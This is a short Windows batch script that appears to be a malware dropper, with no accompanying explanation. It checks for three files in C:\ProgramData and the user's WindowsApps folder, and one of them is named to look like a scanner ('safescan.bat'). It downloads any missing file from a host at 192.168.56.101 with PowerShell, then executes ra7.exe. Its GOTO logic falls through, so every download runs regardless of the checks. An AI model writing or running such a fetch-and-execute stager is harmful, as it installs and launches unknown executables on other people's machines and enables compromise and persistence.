@ECHO OFF

IF NOT EXIST C:\ProgramData\ra7.exe (
   GOTO REDOWN1
)

IF NOT EXIST '%USERPROFILE%\AppData\Local\Microsoft\WindowsApps\8uND13.exe' (
   GOTO REDOWN2
)

IF NOT EXIST '%USERPROFILE%\AppData\Local\Microsoft\WindowsApps\safescan.bat' (
   GOTO REDOWN3
)

:REDOWN1
   powershell -Command "Invoke-WebRequest http://192.168.56.101/ra7.exe -OutFile C:\ProgramData\ra7.exe"

:REDOWN2
   powershell -Command "Invoke-WebRequest http://192.168.56.101/8uND13.exe -OutFile '%USERPROFILE%\AppData\Local\Microsoft\WindowsApps\8uND13.exe'"

:REDOWN3
   powershell -Command "Invoke-WebRequest http://192.168.56.101/safescan.bat -OutFile '%USERPROFILE%\AppData\Local\Microsoft\WindowsApps\safescan.bat'"

powershell -Command "& C:\ProgramData\ra7.exe"
